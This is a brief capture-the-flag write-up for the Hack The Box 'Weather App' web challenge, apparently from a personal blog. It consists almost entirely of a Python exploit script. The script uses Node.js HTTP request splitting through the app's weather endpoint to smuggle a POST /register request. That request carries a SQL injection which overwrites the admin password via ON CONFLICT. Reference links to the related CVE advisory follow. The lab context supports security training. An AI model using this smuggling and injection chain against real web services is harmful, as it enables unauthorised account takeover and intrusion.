---
layout: single
title: Weather App [Web] - Hack The Box
excerpt: "ECSC Prep"
date: 2021-12-21
classes: wide
header:
  teaser: 
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Web Challenge
tags:  
  - HTTP request smuggling
  - SQL injection CONFLICT
---

Exploit:
```python
import requests

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


username="admin"
password="dhmos') ON CONFLICT(username) DO UPDATE SET password = 'paok';--"

new_passwd = password.replace("\n","\u0120").replace(" ","\u0120").replace("'","%27").replace('"', "%22")
new_user = username.replace("\n","\u0120").replace(" ","\u0120").replace("'","%27").replace('"', "%22")
Content_Length=len(new_user)+len(new_passwd)+19

print(Content_Length)
smug='127.0.0.1/\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHOST:\u0120127.0.0.1\u010D\u010AContent-Type:\u0120application/x-www-form-urlencoded\u010D\u010AContent-Length:\u0120' + str(Content_Length) + '\u010D\u010A\u010D\u010Ausername=' + new_user + '&password=' + new_passwd + '\u010D\u010A\u010D\u010AGET\u0120/?lol='

requests.post("http://157.245.43.98:30094/api/weather", json={'endpoint': smug, 'city': 'noo', 'country': 'zeoroor'}, proxies=proxies)
```


Ref:
https://nodejs.org/en/blog/vulnerability/november-2018-security-releases/#http-request-splitting-cve-2018-12116
https://hackerone.com/reports/409943
https://stackoverflow.com/questions/15433188/what-is-the-difference-between-r-n-r-and-n
